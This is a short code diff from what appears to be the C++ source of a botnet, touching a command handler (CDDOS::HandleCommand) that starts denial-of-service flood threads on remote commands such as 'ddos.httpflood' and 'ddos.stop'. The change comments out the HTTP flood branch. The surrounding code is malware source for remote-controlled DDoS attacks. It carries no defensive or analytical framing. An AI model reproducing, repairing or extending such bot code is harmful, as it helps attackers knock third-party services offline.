@@ -50,7 +50,7 @@ bool CDDOS::HandleCommand(CMessage *pMsg)
 		pTemp->m_bNotice=pMsg->bNotice;
 		pTemp->Start(); }
 
-	if(!pMsg->sCmd.Compare("ddos.httpflood"))
+	/*if(!pMsg->sCmd.Compare("ddos.httpflood"))
 	{	
 		CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; 
 		m_bDDOSing=true; 
@@ -65,7 +65,7 @@ bool CDDOS::HandleCommand(CMessage *pMsg)
 		pTemp->m_bSilent=pMsg->bSilent;
 		pTemp->m_bNotice=pMsg->bNotice;
 		pTemp->Start(); 
-	}
+	}*/
 
 	if(!pMsg->sCmd.Compare("ddos.stop")) m_bDDOSing=false;
 
